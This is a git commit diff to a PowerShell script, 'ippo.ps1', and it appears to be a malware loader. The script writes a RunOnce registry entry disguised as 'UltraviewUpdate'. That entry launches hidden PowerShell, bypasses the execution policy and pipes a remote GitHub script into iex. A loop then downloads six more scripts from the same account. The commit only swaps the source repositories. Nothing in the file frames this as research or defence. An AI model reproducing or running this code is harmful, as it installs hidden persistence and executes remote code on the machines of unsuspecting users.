636c049eb68f4f3817149acada7ac8ee72ee21bc
jia891 <phamly2tb@gmail.com>
2026-03-16 07:57:54 -0700

    Update ippo.ps1

--- ippo.ps1
+++ ippo.ps1
@@ -1,8 +1,8 @@
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UltraviewUpdate" -Value 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb ''https://raw.githubusercontent.com/jia891/socv/refs/heads/main/install.ps1'' | iex"' -Type String -Force
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UltraviewUpdate" -Value 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb ''https://raw.githubusercontent.com/jia891/ok/refs/heads/main/install.ps1'' | iex"' -Type String -Force
 
 for ($i = 1; $i -le 6; $i++) {
    
-    $url = "https://raw.githubusercontent.com/jia891/pulsarvipppp/refs/heads/main/dc$i.ps1"
+    $url = "https://raw.githubusercontent.com/jia891/ok/refs/heads/main/dc$i.ps1"
     
     
     $webClient = New-Object System.Net.WebClient
